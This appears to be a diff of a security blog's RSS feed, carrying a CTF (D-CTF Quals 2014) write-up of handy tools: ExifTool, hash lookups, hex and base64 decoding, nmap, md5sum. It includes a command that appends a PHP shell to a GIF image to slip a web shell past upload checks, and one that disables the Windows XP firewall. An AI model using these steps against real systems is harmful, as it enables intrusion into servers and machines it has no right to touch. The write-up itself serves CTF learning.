-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;curl&lt;/span&gt; &lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;user&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;manager&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;nonce&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;7413734&lt;/span&gt;&lt;span class="n"&gt;ab666ce02cf27c9862c96a8e7&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;pass&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="n"&gt;ecd6317a873b18e7dde351ac094ee3b&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt; &lt;span class="n"&gt;HOST&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
-
-
-&lt;h3&gt;&lt;a href="http://en.wikipedia.org/wiki/Exchangeable_image_file_format"&gt;Exif&lt;/a&gt; data extractor:&lt;/h3&gt;
-&lt;p&gt;&lt;a href="http://www.sno.phy.queensu.ca/~phil/exiftool/index.html"&gt;ExifTool&lt;/a&gt;  is used for reading, writing, and manipulating image metadata:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;tar -xf Image-ExifTool-9.74.tar.gz
-&lt;span class="nv"&gt;$ &lt;/span&gt; &lt;span class="nb"&gt;cd &lt;/span&gt;Image-ExifTool-9.74/
-&lt;span class="nv"&gt;$ &lt;/span&gt;perl Makefile.PL
-&lt;span class="nv"&gt;$ &lt;/span&gt;make &lt;span class="nb"&gt;test&lt;/span&gt;
-&lt;span class="nv"&gt;$ &lt;/span&gt;sudo make install
-&lt;span class="nv"&gt;$ &lt;/span&gt;exiftool IMAGEFILE
-&lt;/pre&gt;&lt;/div&gt;
-
-
-&lt;h3&gt;MD5 Lookups&lt;/h3&gt;
-&lt;p&gt;Several hashes in this CTF needed to be searched. Google in general does a good job, but here are some specific websites: &lt;a href="http://hash-killer.com/"&gt;hash-killer&lt;/a&gt; and &lt;a href="http://www.md5this.com/"&gt;md5this&lt;/a&gt;.&lt;/p&gt;
-&lt;h3&gt;In the Shell&lt;/h3&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;Hexadecimal decoders&lt;/strong&gt; are essential. You can use Python's &lt;a href="https://docs.python.org/2/library/functions.html#hex"&gt;hex&lt;/a&gt;:&lt;/li&gt;
-&lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;python -c &lt;span class="s1"&gt;&amp;#39;print &amp;quot;2f722f6e6574736563&amp;quot;.decode(&amp;quot;hex&amp;quot;)&amp;#39;&lt;/span&gt;
-/r/netsec
-&lt;/pre&gt;&lt;/div&gt;
-
-
-&lt;p&gt;or command line &lt;a href="http://linuxcommand.org/man_pages/xxd1.html"&gt;xxd&lt;/a&gt;:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;yum install vim-common
-&lt;span class="nv"&gt;$ &lt;/span&gt;xxd -r -p &lt;span class="o"&gt;&amp;lt;&amp;lt;&amp;lt;&lt;/span&gt; 2f722f6e6574736563
-/r/netsec
-&lt;/pre&gt;&lt;/div&gt;
-
-
-&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;Base64 decoders&lt;/strong&gt; are also essential:&lt;/li&gt;
-&lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;base64 --decode &lt;span class="o"&gt;&amp;lt;&amp;lt;&amp;lt;&lt;/span&gt; BASE64STRING &amp;gt; OUTPUT
-&lt;/pre&gt;&lt;/div&gt;
-
-
-&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;nmap&lt;/strong&gt;, obviously. You can use it in Python scripts, using the &lt;a href="https://docs.python.org/2/library/subprocess.html"&gt;subprocess&lt;/a&gt; library:&lt;/li&gt;
-&lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;[*] Scanning for open ports using nmap&amp;quot;&lt;/span&gt;
-&lt;span class="n"&gt;subprocess&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;call&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;nmap -sS -sV -T4 -p 22-2048 &amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;base_URL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;shell&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
-
-
-&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;tee&lt;/strong&gt; is nice to store and view the output of another command. It can be very useful with &lt;em&gt;curl&lt;/em&gt;. A simple  example:&lt;/li&gt;
-&lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;ls | tee file
-&lt;/pre&gt;&lt;/div&gt;
-
-
-&lt;ul&gt;
-&lt;li&gt;
-&lt;p&gt;&lt;strong&gt;chattr&lt;/strong&gt; is used to change the file attributes of a Linux file system. For example, the command &lt;code&gt;chattr +i&lt;/code&gt; on a file make it not be able to be removed (useful for &lt;em&gt;zombie&lt;/em&gt; processes hunting).&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;&lt;strong&gt;nm&lt;/strong&gt; is useful for listing symbols from object files&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;&lt;strong&gt;md5 hashing&lt;/strong&gt; is used all the time:&lt;/p&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;&lt;span class="nb"&gt;echo&lt;/span&gt; -n password | md5sum
-5f4dcc3b5aa765d61d8327deb882cf99
-&lt;/pre&gt;&lt;/div&gt;
-
-
-&lt;ul&gt;
-&lt;li&gt;You might want to &lt;strong&gt;append a shell code to an image&lt;/strong&gt; (for example, a GIF file):&lt;/li&gt;
-&lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;cat PHP-shell.php &amp;gt;&amp;gt; fig.gif
-&lt;/pre&gt;&lt;/div&gt;
-
-
-&lt;ul&gt;
-&lt;li&gt;Now a special one: Windows! One of the trivia questions in this CTF. How to disable the Windows XP Firewall from command line:&lt;/li&gt;
-&lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;netsh firewall &lt;span class="nb"&gt;set &lt;/span&gt;opmode &lt;span class="nv"&gt;mode&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;DISABLE.
-&lt;/pre&gt;&lt;/div&gt;
-
-
-&lt;hr /&gt;
-&lt;p&gt;&lt;strong&gt;That's it. Hack all the things!&lt;/strong&gt;&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">bt3</dc:creator><pubDate>Wed, 22 Oct 2014 06:30:00 -0400</pubDate><guid>tag:bt3gl.github.io,2014-10-22:exploring-d-ctf-quals-2014s-exploits.html</guid><category>Linux</category><category>RFI</category><category>SQL_injection</category><category>LFI</category><category>RCE</category><category>PHP</category><category>CMS</category><category>ApPHP</category><category>unoconv</category><category>ColdFusion</category><category>Buffer_Overflow</category><category>Steganography</category><category>Wireshark</category><category>ExifTool</category><category>netsh</category><category>CTF</category><category>scapy</category><category>RIPS</category><category>Heartbleed</category><category>nmap</category></item></channel></rss>
+&lt;p&gt;&lt;strong&gt;That's it! Hack all the things!&lt;/strong&gt;&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">bt3</dc:creator><pubDate>Thu, 23 Oct 2014 06:30:00 -0400</pubDate><guid>tag:bt3gl.github.io,2014-10-23:the-peace-pipe-at-hacklus-final-ctf-2014.html</guid><category>SSH</category></item></channel></rss>
